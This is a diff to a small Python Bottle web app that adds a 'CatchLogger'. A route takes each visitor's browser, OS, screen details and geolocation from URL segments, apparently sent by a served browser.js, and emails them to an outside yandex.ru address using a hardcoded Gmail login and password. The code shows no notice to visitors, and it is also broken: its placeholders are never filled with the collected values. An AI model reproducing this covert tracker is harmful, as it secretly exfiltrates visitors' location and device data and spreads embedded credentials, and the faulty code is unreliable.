@@ -8,11 +8,60 @@ def page_file(root, filename):
 
 def html(filename):
 	filename += ".html"
-	return static_file(filename, root="./html/")    
+	return static_file(filename, root="./html/")
+
+def send_email(text): 
+    fromaddr = "noreply.intschool@gmail.com"
+    toaddr = "andtun@yandex.ru"
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "CatchLogger results"
+     
+    body = text
+    msg.attach(MIMEText(body, 'plain'))
+     
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(fromaddr, "adminpsw")
+    text = msg.as_string()
+    server.sendmail(fromaddr, toaddr, text)
+    server.quit()
+
 
 @get("/")
 def man():
     return html("index")
+
+@get("/browser.js")
+def rtrn():
+    return static_file('browser.js', root='./js/')
+
+@get("/get_info/<brser>/<lng>/<ops>/<bbrser>/<bos>/<height>/<width>/<colors>/<lat>/<long>/<rad>")
+def obr(brser, lng, ops, bbrser, bos, height, width, colors, lat, long, rad):
+    text = """By navigator:
+Browser: %s
+Language: %s
+OS: %s
+
+By BrowserDetect:
+Browser: %s
+OS: %s
+
+Window:
+Height: %s
+Width: %s
+Color number: %s
+
+Location:
+latitude: %s
+longitude: %s
+Radius: %s
+
+----
+CatchLogger system by Andrey A Tyunyatkin"""
+    send_email(text)
+    
 
 @get("/login")
 def login():
